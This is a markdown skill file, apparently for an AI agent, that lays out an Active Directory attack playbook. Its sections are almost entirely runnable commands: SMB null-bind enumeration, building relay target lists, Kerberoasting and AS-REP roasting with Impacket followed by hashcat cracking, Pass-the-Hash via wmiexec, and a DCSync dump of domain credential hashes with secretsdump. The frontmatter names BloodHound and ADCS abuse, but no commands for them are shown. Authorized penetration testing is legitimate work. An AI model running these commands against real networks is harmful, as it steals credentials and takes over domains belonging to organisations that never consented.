---
name: "active-directory-attacks"
description: "Enterprise Active Directory domain penetration testing, Kerberoasting, AS-REP Roasting, Pass-the-Hash, DCSync, BloodHound graph analysis, and ADCS certificate abuse."
---

# Active Directory & Enterprise Domain Attacks Playbook

## 1. Domain Enumeration with NetExec
```bash
# Check anonymous/null bind
netexec smb <DC_IP> -u '' -p '' --shares

# Check SMB Signing and Spooler service
netexec smb <SUBNET>/24 -u 'user' -p 'pass' --gen-relay-list relay.txt
```

## 2. Kerberoasting (Requesting TGS for Service Accounts)
Extract Kerberos service tickets for accounts with SPNs to crack offline:
```bash
# Extract with Impacket
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt

# Crack with Hashcat (Mode 13100)
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

## 3. AS-REP Roasting (Accounts without Kerberos Pre-auth)
```bash
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip <DC_IP>
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt
```

## 4. Lateral Movement & DCSync
```bash
# Pass-the-Hash with Impacket
wmiexec.py -hashes :<NTLM_HASH> <DOMAIN>/<ADMIN>@<TARGET_IP>

# DCSync Domain Hashes
secretsdump.py <DOMAIN>/<ADMIN>:<PASS>@<DC_IP> -just-dc
```
